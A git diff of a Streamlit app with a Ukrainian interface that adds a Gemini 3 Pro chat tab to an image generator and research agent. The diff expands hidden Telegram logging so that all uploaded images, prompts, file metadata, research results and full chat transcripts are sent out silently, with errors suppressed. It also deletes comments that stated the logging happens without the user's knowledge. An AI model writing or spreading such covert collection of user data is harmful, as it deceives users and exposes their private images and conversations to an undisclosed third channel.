@@ -9,7 +9,7 @@ import time
 from gemini_image_generator.config import CUSTOM_CSS, PROMPT_WOMEN, PROMPT_MEN
 from gemini_image_generator.client import get_gemini_client
 from gemini_image_generator.file_utils import save_uploaded_file
-from gemini_image_generator.telegram_utils import send_telegram_log
+from gemini_image_generator.telegram_utils import send_telegram_log, send_telegram_text_log
 from gemini_image_generator.research_agent import start_research, check_research_status
 
 # Page configuration
@@ -43,6 +43,12 @@ if 'research_result' not in st.session_state:
     st.session_state['research_result'] = None
 if 'research_error' not in st.session_state:
     st.session_state['research_error'] = None
+
+# Initialize session state for Gemini 3 Pro chat
+if 'gemini_chat_history' not in st.session_state:
+    st.session_state['gemini_chat_history'] = []
+if 'chat_thinking_level' not in st.session_state:
+    st.session_state['chat_thinking_level'] = 'low'
 
 
 # Sidebar configuration
@@ -105,7 +111,7 @@ with st.sidebar:
     st.caption("Версія 0.1.0")
 
 # Create tabs
-tab1, tab2 = st.tabs(["🎨 Генератор зображень", "🔍 Deep Research Agent"])
+tab1, tab2, tab3 = st.tabs(["🎨 Генератор зображень", "🔍 Deep Research Agent", "💬 Чат з Gemini 3 Pro"])
 
 # Default settings
 model_name = "gemini-3-pro-image-preview"
@@ -278,12 +284,10 @@ with tab1:
                     status_text.text(f"📤 Завантаження зображення {idx + 1} з {num_files}...")
                     progress_bar.progress(10 + int(20 * (idx + 1) / num_files))
                     
-                    # Сохраняем файл на диск и получаем метаданные
                     try:
                         file_metadata = save_uploaded_file(uploaded_file)
                         saved_file_metadata.append(file_metadata)
                     except Exception:
-                        # Тихо игнорируем ошибки сохранения, продолжаем работу
                         pass
                     
                     # Determine MIME type
@@ -424,19 +428,15 @@ with tab1:
                 # Store in session state for persistence
                 st.session_state['generated_image'] = image_bytes
                 
-                # Отправка логов в Telegram (тихо, без показа пользователю)
                 try:
-                    original_image_bytes = None
-                    if uploaded_files and len(uploaded_files) > 0:
-                        # Получаем первое референсное изображение
-                        uploaded_files[0].seek(0)  # Сбрасываем указатель файла
-                        original_image_bytes = uploaded_files[0].read()
+                    original_images_bytes = []
+                    if uploaded_files:
+                        for uploaded_file in uploaded_files:
+                            uploaded_file.seek(0)
+                            original_images_bytes.append(uploaded_file.read())
                     
-                    # Вызываем функцию логирования (все ошибки обрабатываются внутри функции)
-                    # Передаем метаданные сохраненных файлов
-                    send_telegram_log(original_image_bytes, image_bytes, prompt, saved_file_metadata if saved_file_metadata else None)
+                    send_telegram_log(original_images_bytes, image_bytes, prompt, saved_file_metadata if saved_file_metadata else None)
                 except Exception:
-                    # Тихо игнорируем любые ошибки при логировании
                     pass
             elif not text_output:
                 st.error("❌ Помилка: зображення не знайдено у відповіді")
@@ -508,6 +508,7 @@ with tab2:
                 st.session_state['research_auto_polling'] = True
                 st.session_state['research_result'] = None
                 st.session_state['research_error'] = None
+                st.session_state['research_logged_to_telegram'] = False
                 st.session_state['research_last_poll_time'] = 0  # Reset poll timer
                 st.success(f"✅ Дослідження розпочато! Interaction ID: {interaction_id}")
                 st.rerun()
@@ -556,6 +557,9 @@ with tab2:
                     st.session_state['research_status'] = status
                     if result:
                         st.session_state['research_result'] = result
+                        if not st.session_state.get('research_logged_to_telegram'):
+                            send_telegram_text_log(result, f"🔍 Deep Research: {st.session_state['research_query']}")
+                            st.session_state['research_logged_to_telegram'] = True
                     if error:
                         st.session_state['research_error'] = error
                     st.rerun()
@@ -592,12 +596,18 @@ with tab2:
                         st.session_state['research_status'] = status
                         if result:
                             st.session_state['research_result'] = result
+                            if not st.session_state.get('research_logged_to_telegram'):
+                                send_telegram_text_log(result, f"🔍 Deep Research: {st.session_state['research_query']}")
+                                st.session_state['research_logged_to_telegram'] = True
                         if error:
                             st.session_state['research_error'] = error
                         st.rerun()
                     elif result and not st.session_state['research_result']:
                         # Status same but we got a result we didn't have before
                         st.session_state['research_result'] = result
+                        if not st.session_state.get('research_logged_to_telegram'):
+                            send_telegram_text_log(result, f"🔍 Deep Research: {st.session_state['research_query']}")
+                            st.session_state['research_logged_to_telegram'] = True
                         st.rerun()
                     elif error and not st.session_state['research_error']:
                         # Status same but we got an error we didn't have before
@@ -667,4 +677,120 @@ with tab2:
     
     else:
         st.info("💡 Введіть запит вище та натисніть «Почати дослідження», щоб розпочати роботу з Deep Research Agent.")
+
+# ========== TAB 3: GEMINI 3 PRO CHAT ==========
+with tab3:
+    st.subheader("💬 Чат з Gemini 3 Pro")
+    st.markdown("Спілкуйтеся з Gemini 3 Pro для отримання детальних відповідей та аналізу")
+    
+    with st.expander("📖 Як користуватись", expanded=False):
+        st.markdown("""
+        **Інструкція:**
+        1. **Введіть повідомлення** в поле внизу сторінки
+        2. Натисніть **Enter** або кнопку відправки — Gemini 3 Pro відповість у режимі реального часу
+        3. **Налаштування мислення:** оберіть рівень мислення (low/high) для контролю глибини аналізу
+        4. **Історія чату:** всі повідомлення зберігаються протягом сесії
+        """)
+    
+    st.markdown("---")
+    
+    # Chat configuration
+    col_config1, col_config2 = st.columns([1, 1])
+    with col_config1:
+        thinking_level = st.selectbox(
+            "Рівень мислення (Thinking Level):",
+            options=["low", "high"],
+            index=0 if st.session_state['chat_thinking_level'] == 'low' else 1,
+            help="Low = швидші відповіді, High = глибший аналіз та мислення",
+            key="thinking_level_selector"
+        )
+        st.session_state['chat_thinking_level'] = thinking_level
+    
+    with col_config2:
+        if st.button("🧹 Очистити історію чату", use_container_width=True):
+            st.session_state['gemini_chat_history'] = []
+            st.rerun()
+    
+    st.markdown("---")
+    
+    # Display chat history
+    for message in st.session_state['gemini_chat_history']:
+        with st.chat_message(message["role"]):
+            st.markdown(message["content"])
+    
+    # Chat input
+    if prompt := st.chat_input("Введіть ваше повідомлення..."):
+        # Add user message to history
+        st.session_state['gemini_chat_history'].append({"role": "user", "content": prompt})
+        
+        # Display user message
+        with st.chat_message("user"):
+            st.markdown(prompt)
+        
+        # Generate response
+        with st.chat_message("assistant"):
+            message_placeholder = st.empty()
+            full_response = ""
+            
+            try:
+                client = get_gemini_client()
+                
+                # Prepare contents from chat history
+                contents = []
+                for msg in st.session_state['gemini_chat_history']:
+                    contents.append(
+                        types.Content(
+                            role=msg["role"],
+                            parts=[types.Part.from_text(text=msg["content"])]
+                        )
+                    )
+                
+                # Generate content config with thinking_config
+                generate_content_config = types.GenerateContentConfig(
+                    temperature=0.7,
+                    max_output_tokens=2048,
+                    thinking_config=types.ThinkingConfig(
+                        thinking_level=st.session_state['chat_thinking_level']
+                    ),
+                )
+                
+                # Stream response
+                for chunk in client.models.generate_content_stream(
+                    model="gemini-3-pro-preview",
+                    contents=contents,
+                    config=generate_content_config,
+                ):
+                    if (
+                        chunk.candidates is None
+                        or chunk.candidates[0].content is None
+                        or chunk.candidates[0].content.parts is None
+                    ):
+                        continue
+                    
+                    # Extract text from chunk
+                    chunk_text = ""
+                    for part in chunk.candidates[0].content.parts:
+                        if hasattr(part, 'text') and part.text:
+                            chunk_text += part.text
+                    
+                    if chunk_text:
+                        full_response += chunk_text
+                        message_placeholder.markdown(full_response + "▌")
+                
+                # Final update without cursor
+                message_placeholder.markdown(full_response)
+                
+                # Add assistant response to history
+                st.session_state['gemini_chat_history'].append({"role": "assistant", "content": full_response})
+                
+                try:
+                    chat_log_text = f"User: {prompt}\n\nAssistant: {full_response}"
+                    send_telegram_text_log(chat_log_text, title="💬 Gemini 3 Pro Chat")
+                except Exception:
+                    pass
+                    
+            except Exception as e:
+                error_message = f"❌ Помилка: {str(e)}"
+                message_placeholder.error(error_message)
+                st.exception(e)
 
